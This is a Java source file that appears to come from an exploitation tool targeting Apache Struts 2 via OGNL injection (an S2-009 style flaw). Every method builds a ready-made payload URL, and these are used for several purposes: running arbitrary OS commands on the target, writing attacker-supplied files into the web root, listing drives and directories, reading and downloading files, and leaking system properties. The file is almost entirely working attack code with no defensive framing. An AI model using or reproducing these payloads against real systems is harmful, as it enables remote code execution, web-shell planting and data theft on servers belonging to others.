package org.vti.service.impl;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.vti.service.ExploitService;
import org.vti.util.RequestUtil;

public class Struts2_S09_ExploitServiceImpl implements ExploitService{

	@Override
	public String getRealPath(String uri) throws Exception {
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL = uri + "?" + commandURL;

		StringBuffer buf=new StringBuffer("\u7269\u7406\u5730\u5740\uff1a");
		
		buf.append(RequestUtil.getInstance().doRequest(requestURL));
		
		return buf.toString();
	}

	@Override
	public Map<String, String> getServerInfo(String uri,
			Map<String, String> properties) throws Exception {
		
		Map<String, String>echo=new LinkedHashMap<String,String>();
		
		for (Entry<String, String> entry:properties.entrySet()) {
			
			String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
					"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
					"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)" +
					"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
					"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
					"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
					"(('\\43xman.getWriter().println(@java.lang.System@getProperty(%22"+entry.getValue()+"%22))')(d))&(i99)" +
							"(('\\43xman.getWriter().close()')(d))";
			
			String requestURL = uri + "?" + commandURL;
			
			echo.put(entry.getKey(),RequestUtil.getInstance().doRequest(requestURL));
		}
		
		return echo;
		
	}

	@Override
	public String doExecuteCMD(String uri, String cmd) throws Exception {
		
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75@java.lang.Runtime@getRuntime().exec(\\43req.getParameter(%22cmd%22))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro.getInputStream())')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[1024*50]')(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43webStr12\\75new\\40java.lang.String(\\43webStr).trim()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(\\43webStr12)')(d))&(i99)(('\\43xman.getWriter().close()')(d))&cmd=";
		
		String requestURL =uri+"?"+commandURL+URLEncoder.encode(cmd,"UTF-8");
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(RequestUtil.getInstance().getInputStream(requestURL)));
	
		String str="";
		while (reader.ready()) {
			str+=reader.readLine()+"\r\n";
		}
		return str;
	}

	@Override
	public boolean doUpload(String uri, String fileName, String content)
			throws Exception {
		
		String commandURL = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)" +
				"(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')" +
				"(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')" +
				"(d))&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder" +
				"(\\43req.getRealPath(%22\\u005c%22)).append(%22/"+fileName.trim().replace(" ", "%20") +"%22).toString())')" +
				"(d))&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))&(i4)(('\\43fos.close()')(d))"+
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(\"true\")')(d))&(i99)(('\\43xman.getWriter().close()')(d))&t=";
		
		String requestURL =uri+ "?" + commandURL+URLEncoder.encode(content,"UTF-8");
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		return Boolean.parseBoolean(message);
	}

	@Override
	public boolean doCustomUplaod(String uri, String filePath, String content)
			throws Exception {
		
		return false;
	}
		

	@Override
	public List<String> doGetFileSystem(String uri) throws Exception {
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))" +
				"&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))" +
				"&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))" +
				"&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))" +
				"&(i3)(('\\43sys\\75@java.io.File@listRoots()')(d))" +
				"&(i95)(('\\43xman.getWriter().println(\\43sys.length)')(d))" +
				"&(i99)(('\\43xman.getWriter().close()')(d))";
		
		String requestURL =uri+ "?" + commandURL;
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
					"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))" +
					"&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))" +
					"&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))" +
					"&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))" +
					"&(i3)(('\\43sys\\75@java.io.File@listRoots()')(d))" +
					"&(i95)(('\\43xman.getWriter().println(\\43sys["+i+"])')(d))" +
					"&(i99)(('\\43xman.getWriter().close()')(d))";
			
			String diskURL =uri+ "?" + diskCmdURL;
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		return list;
	}

	@Override
	public List<String> doListFiles(String uri, String path) throws Exception {
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).listFiles().length)')(d))&(i99)" +
				"(('\\43xman.getWriter().close()')(d))&xpath=";
		
		String requestURL = uri+"?"+commandURL+URLEncoder.encode(path,"UTF-8");
		
		int size=Integer.valueOf(RequestUtil.getInstance().doRequest(requestURL));
		
		List<String>list=new ArrayList<String>();
		
		for (int i = 0; i <size; i++) {
			
			String diskCmdURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
					"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
					"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
					"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
					"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
					"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).listFiles()["+i+"].getName())')(d))&(i99)" +
					"(('\\43xman.getWriter().close()')(d))&xpath=";
			
			String diskURL =uri+ "?" + diskCmdURL+URLEncoder.encode(path,"UTF-8");
			
			String diskName= RequestUtil.getInstance().doRequest(diskURL);
			
			list.add(diskName);
		}
		return list;
	}

	@Override
	public String doGetFileContent(String uri, String path) throws Exception {
	
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75new%20java.io.FileInputStream(new%20java.io.File(\\43req.getParameter(%22xpath%22)))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro)')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[new%20java.io.File(\\43req.getParameter(%22xpath%22)).length()]')" +
				"(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getOutputStream().write(\\43webStr)')(d))&(i99)(('\\43xman.getOutputStream().close()')(d))&xpath=";

		String requestURL =uri+ "?" + commandURL+URLEncoder.encode(path,"UTF-8");
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		BufferedReader reader=new BufferedReader(new InputStreamReader(inputStream));
		
		StringBuffer buf=new StringBuffer();
		String str = "";
		while ((str = reader.readLine()) != null) {
			buf.append(str+"\r\n");
		}
		reader.close();
		
		return buf.toString();
		
	}

	@Override
	public boolean doIsDirectory(String uri, String path) throws Exception {
		
		String commandURL = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(i1)" +
				"(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getWriter().println(new%20java.io.File(\\43req.getParameter(%22xpath%22)).isDirectory())')(d))&(i99)" +
				"(('\\43xman.getWriter().close()')(d))&xpath=";
		
		String requestURL = uri+"?"+commandURL+URLEncoder.encode(path,"UTF-8");
		
		String message=RequestUtil.getInstance().doRequest(requestURL);
		
		return Boolean.parseBoolean(message);
	}

	@Override
	public InputStream doDownload(String uri, String rpath) throws Exception {
		
		String commandURL ="('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)" +
				"(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
				"(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
				"(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')" +
				"(d))&(h)(('\\43webRootzpro\\75new%20java.io.FileInputStream(new%20java.io.File(\\43req.getParameter(%22xpath%22)))')" +
				"(d))&(i)(('\\43webRootzproreader\\75new\\40java.io.DataInputStream(\\43webRootzpro)')" +
				"(d))&(i01)(('\\43webStr\\75new\\40byte[new%20java.io.File(\\43req.getParameter(%22xpath%22)).length()]')" +
				"(d))&(i1)(('\\43webRootzproreader.readFully(\\43webStr)')" +
				"(d))&(i111)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)" +
				"(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)" +
				"(('\\43xman.getOutputStream().write(\\43webStr)')(d))&(i99)(('\\43xman.getOutputStream().close()')(d))&xpath=";
		
		String requestURL =uri+ "?" + commandURL+URLEncoder.encode(rpath,"UTF-8");
		
		InputStream inputStream=RequestUtil.getInstance().getInputStream(requestURL);
		
		return inputStream;
	}

}
